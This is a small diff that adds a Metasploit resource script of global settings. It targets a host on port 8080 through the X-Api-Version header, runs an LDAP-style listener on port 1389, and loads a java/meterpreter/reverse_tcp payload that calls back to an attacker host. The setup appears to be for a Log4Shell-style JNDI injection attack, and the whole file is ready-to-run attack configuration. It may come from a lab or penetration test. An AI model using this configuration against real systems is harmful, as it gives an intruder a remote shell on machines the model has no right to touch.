@@ -1,0 +1,9 @@
+setg HTTP_HEADER X-Api-Version
+setg RHOSTS 10.208.89.15
+setg RPORT 8080
+setg SRVHOST 10.208.5.100
+setg SRVPORT 1389
+setg TARGETURI /
+setg HTTP_SRVPORT 8080
+setg LHOST 10.208.5.100
+setg payload java/meterpreter/reverse_tcp
